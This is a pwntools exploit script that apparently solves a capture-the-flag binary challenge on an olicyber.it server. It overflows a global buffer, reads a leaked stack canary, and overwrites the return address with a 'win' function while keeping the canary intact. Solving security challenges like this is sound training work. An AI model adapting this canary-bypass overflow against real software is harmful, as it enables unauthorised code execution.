from pwn import *

context.arch = 'amd64'
p = remote("baas.challs.olicyber.it", 38061)

bsspayl = b'A' * 32 + p64(0x1337)

print(p.recvuntil(b'Enter option: '))
p.sendline(b'2')

print(p.recvuntil(b'Give me the global data: '))
p.sendline(bsspayl)

p.sendlineafter(b'Enter option: ', b'3')

print(p.recvuntil(b'Take this gift: 0x'))
canary = int(p.recvline().strip(), 16)

print((f'Canary: {hex(canary)}'))

win = 0x401290
stackpayl = flat(
    b'A' * 40,
    canary,
    b'B' * 8,
    win
)

p.sendlineafter(b'Enter option: ', b'1')
p.sendlineafter(b'Give me the stack data: ', stackpayl)
p.sendlineafter(b'Enter option: ', b'4')

p.interactive()